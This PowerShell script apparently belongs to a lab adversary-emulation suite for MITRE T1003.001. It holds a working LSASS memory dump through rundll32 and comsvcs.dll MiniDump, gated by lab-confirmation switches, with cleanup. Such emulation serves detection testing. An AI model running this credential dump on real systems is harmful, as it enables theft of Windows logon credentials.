<#
.SYNOPSIS
    RASD-Red · T1003.001 · LSASS MiniDump via comsvcs.dll (dump deleted by cleanup).
.DESCRIPTION
    Runs rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass PID> C:\Windows\Temp\<marker>.dmp full
    and waits for it. collect_artifacts.ps1 hashes the dump and cleanup.ps1 deletes it.
    Requires an elevated session and the opt-in -IncludeCredentialAccess, here as well as on the
    runner, so a direct call cannot dump LSASS by mistake. Lab use only.
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory)] [ValidatePattern('^rasd_[0-9a-f]{8}$')] [string] $Marker,
    [Parameter(Mandatory)] [switch] $LabConfirmed,
    [Parameter(Mandatory)] [switch] $IncludeCredentialAccess
)
Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'
if (-not $LabConfirmed) { throw 'Refusing to run without -LabConfirmed.' }
if (-not $IncludeCredentialAccess) { throw 'Refusing to run without -IncludeCredentialAccess: this step dumps LSASS memory.' }
. (Join-Path $PSScriptRoot '..\..\lab\RasdLabGuard.ps1')
Assert-RasdLab

$lsass = (Get-Process -Name lsass).Id
# MiniDump splits its argument on spaces and cannot take a quoted path, so the dump goes to a
# fixed folder with no spaces (a profile path such as C:\Users\Jane Doe\... would break it)
$dump = Join-Path "$env:SystemRoot\Temp" "$Marker.dmp"
if ($dump -match '\s') { throw "dump path contains whitespace: $dump" }
Start-Process -FilePath rundll32.exe -ArgumentList "C:\Windows\System32\comsvcs.dll, MiniDump $lsass $dump full" -Wait
if (-not (Test-Path -LiteralPath $dump)) {
    Write-Warning 'No dump was written (LSA protection or endpoint protection blocked it); the access attempt is still logged'
}
